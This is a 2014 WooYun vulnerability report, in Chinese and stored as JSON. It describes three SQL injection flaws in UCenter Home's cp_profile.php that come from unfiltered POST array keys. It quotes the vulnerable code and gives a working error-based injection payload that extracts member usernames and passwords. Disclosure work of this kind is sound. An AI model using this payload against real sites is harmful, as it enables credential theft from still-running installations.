{"id": 496, "wybug_id": "wooyun-2014-069650", "wybug_title": "Ucenter Home最新版SQL注入三处", "wybug_corp": "Discuz!", "wybug_author": "xfkxfk", "wybug_date": "2014-07-25 12:24", "wybug_open_date": "2014-10-23 12:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向公众公开  简要描述： Ucenter Home最新版SQL注入三处 详细说明：  从官方下载最新版Ucenter Home第一处SQL注入：个人设置——个人资料——基本资料文件/source/cp_profile.php:\nif($_GET['op'] == 'base') {\t\tif(submitcheck('profilesubmit') || submitcheck('nextsubmit')) {\t\t\t\tif(!@include_once(S_ROOT.'./data/data_profilefield.php')) {\t\t\tinclude_once(S_ROOT.'./source/function_cache.php');\t\t\tprofilefield_cache();\t\t}\t\t$profilefields = empty($_SGLOBAL['profilefield'])?array():$_SGLOBAL['profilefield'];......//隐私\t\t$inserts = array();\t\tforeach ($_POST['friend'] as $key => $value) {\t\t\t$value = intval($value);\t\t\t$inserts[] = \"('base','$key','$space[uid]','$value')\";\t\t}\t\tif($inserts) {\t\t\t$_SGLOBAL['db']->query(\"DELETE FROM \".tname('spaceinfo').\" WHERE uid='$space[uid]' AND type='base'\");\t\t\t$_SGLOBAL['db']->query(\"INSERT INTO \".tname('spaceinfo').\" (type,subtype,uid,friend)\t\t\t\tVALUES \".implode(',', $inserts));\t\t}\n从上述代码中可以看到：\n$inserts = array();\t\tforeach ($_POST['friend'] as $key => $value) {\t\t\t$value = intval($value);\t\t\t$inserts[] = \"('base','$key','$space[uid]','$value')\";\t\t}\n$_POST['friend']的key和value进入了inserts中这里的value被处理了但是key没有处理。再来看：\n$_SGLOBAL['db']->query(\"INSERT INTO \".tname('spaceinfo').\" (type,subtype,uid,friend)\t\t\t\tVALUES \".implode(',', $inserts));\n然后inserts直接进入了sql语句总结：key没有过滤进入了inserts中，然后inserts进入了SQL语句，导致sql注入。第二处SQL注入：个人设置——个人资料——个人信息文件/source/cp_profile.php:\nelseif ($_GET['op'] == 'info') {\t\tif(submitcheck('profilesubmit')) {\t\t\t\t$inserts = array();\t\tforeach ($_POST['info'] as $key => $value) {\t\t\t$value = getstr($value, 500, 1, 1);\t\t\t$friend = intval($_POST['info_friend'][$key]);\t\t\t$inserts[] = \"('$space[uid]','info','$key','$value','$friend')\";\t\t}\t\t\t\tif($inserts) {\t\t\t$_SGLOBAL['db']->query(\"DELETE FROM \".tname('spaceinfo').\" WHERE uid='$space[uid]' AND type='info'\");\t\t\t$_SGLOBAL['db']->query(\"INSERT INTO \".tname('spaceinfo').\"\t\t\t\t(uid,type,subtype,title,friend)\t\t\t\tVALUES \".implode(',', $inserts));\t\t}\n同样，key没有过滤进入了inserts中，然后inserts进入了SQL语句，导致sql注入。第三处SQL注入：个人设置——个人资料——联系方式文件/source/cp_profile.php:\nelseif ($_GET['op'] == 'contact') {\t\tif($_GET['resend']) {\t\t//重新发送邮箱验证\t\t$toemail = $space['newemail']?$space['newemail']:$space['email'];\t\temailcheck_send($space['uid'], $toemail);\t\tshowmessage('do_success', \"cp.php?ac=profile&op=contact\");\t}......//隐私\t\t$inserts = array();\t\tforeach ($_POST['friend'] as $key => $value) {\t\t\t$value = intval($value);\t\t\t$inserts[] = \"('contact','$key','$space[uid]','$value')\";\t\t}\t\tif($inserts) {\t\t\t$_SGLOBAL['db']->query(\"DELETE FROM \".tname('spaceinfo').\" WHERE uid='$space[uid]' AND type='contact'\");\t\t\t$_SGLOBAL['db']->query(\"INSERT INTO \".tname('spaceinfo').\" (type,subtype,uid,friend)\t\t\t\tVALUES \".implode(',', $inserts));\t\t}\n同样，key没有过滤进入了inserts中，然后inserts进入了SQL语句，导致sql注入。   漏洞证明：  第一处SQL证明：登陆，修改个人资料，修改基本资料\n\n填写信息，点击保存，抓包，修改POST信息：\nname=111111&sex=1&marry=1&friend%5Bmarry%5D=0&birthyear=2014&birthmonth=7&birthday=25&friend%5Bbirth%5D=0&blood=AB&friend%5Bblood%5D=0&birthprovince=%E5%8C%97%E4%BA%AC&birthcity=%E4%B8%9C%E5%9F%8E&friend%5Bbirthcity%5D=0&resideprovince=%E5%8C%97%E4%BA%AC&residecity=%E4%B8%9C%E5%9F%8E&friend%5Bresidecity%5D=0&profilesubmit=%E4%BF%9D%E5%AD%98&formhash=6acac340&friend[key',(select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(username, 0x23, password) from uchome_member limit 0,1))a from information_schema.tables group by a)b),'value')#]=sqli\n然后看结果：\n\n成功注入。第二处注入和第三处注入的方法一致在修改对应信息时，抓包，修改POST信息即可。   修复方案：  对key值进行处理后再进入sql。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-25 16:20 厂商回复： Uchome已经停止更新维护，感谢您对我们产品的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-25 15:32 |    \t\tAepl│恋爱 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:15        | Forzen恋爱-不要做你的Guest 只想做的你adm...)\t\t \n  1过了    \n     2014-08-27 10:46 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  和这个一样阿貌似，没奖金了。 WooYun: Ucenter Home 2.0 SQL注入2枚（最新版）    \n     2014-08-27 10:54 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @pandas .....    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}